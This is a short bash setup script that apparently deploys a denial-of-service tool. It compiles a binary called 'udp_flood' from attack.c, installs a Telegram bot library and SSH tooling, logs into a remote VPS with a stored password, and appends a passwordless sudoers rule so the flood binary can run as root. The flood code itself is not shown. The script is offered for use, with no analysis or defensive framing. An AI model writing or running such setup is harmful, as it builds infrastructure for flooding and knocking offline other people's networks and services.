#!/bin/bash

pip install pyTelegramBotAPI paramiko
gcc -o udp_flood attack.c -pthread -Wall
sshpass -p "$VPS_PASS" ssh $VPS_USER@$VPS_HOST << 'EOF'
sudo apt update
sudo apt install -y sshpass
echo "root ALL=(ALL) NOPASSWD: /home/root/udp_flood" | sudo tee -a /etc/sudoers
EOF
echo "Setup complete. Binary: udp_flood"
